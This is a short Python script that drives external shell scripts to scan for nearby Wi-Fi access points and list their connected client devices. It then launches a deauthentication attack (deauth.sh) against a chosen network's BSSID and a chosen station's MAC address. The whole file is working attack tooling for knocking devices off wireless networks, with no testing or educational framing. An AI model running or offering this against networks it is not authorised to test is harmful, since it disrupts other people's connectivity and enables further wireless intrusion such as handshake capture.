import os
from os import environ
import csv
from subprocess import Popen,PIPE
import subprocess
import time
import sys

essid=[]
bssid=[]
index=[]
channel=[]
encryption=[]

print (sys.argv)
print("Enter Wifi Intreface index: ")
for i in range(1,len(sys.argv)):
	print(str(i)+"."+sys.argv[i])
i= int(input());
mon=sys.argv[i]
print(str(mon))
os.chmod('scanbssid.sh',0o755)
subprocess.Popen(['bash','scanbssid.sh',str(mon)])
time.sleep(10)

with open('temp/dump-01.kismet.csv' ,encoding='ISO-8859-14') as f:
    reader = csv.reader(f,delimiter=';') 
    next(f);
    for row in reader: # read a row as {column1: value1, column2: value2,...}
    	e=row[2]
    	b=row[3]
    	c=row[5]
    	en=row[7]
    	essid.append(e)
    	bssid.append(b)
    	channel.append(c)
    	encryption.append(en)
    	index.append(row[0])

for i in range(0, len(index)):
	print (i," ",essid[i],"          ",bssid[i],"     ",channel[i],"  ",encryption[i]  )

adfold=0
try:
    adfold = int(input("Enter Index: "))
    #print adf+2
except ValueError:
    print ("Not a number")

os.chmod('scannetworks.sh',0o755)
subprocess.Popen(['bash','scannetworks.sh',str(mon),str(essid[adfold]),str(bssid[adfold]),str(channel[adfold])])

time.sleep(10)
stationmac=[]

with open('temp/dump-02.csv') as f:
    reader = csv.reader(f,delimiter=',') 
    next(f);
    next(f);
    next(f);
    next(f);
    next(f);
    for row in reader: # read a row as {column1: value1, column2: value2,...}
    	if row:
    		sm=row[0]
    		stationmac.append(sm)
			#print(row[0])


for i in range(0, len(stationmac)):
	print(i,bssid[adfold],stationmac[i])

adf=0
nd=0

try:
    adf = int(input("Enter Index: "))
except ValueError:
    print ("Not a number")

os.chmod('deauth.sh',0o755)
subprocess.Popen(['bash','deauth.sh',str(mon),str(nd),str(bssid[adfold]),str(stationmac[adf])])
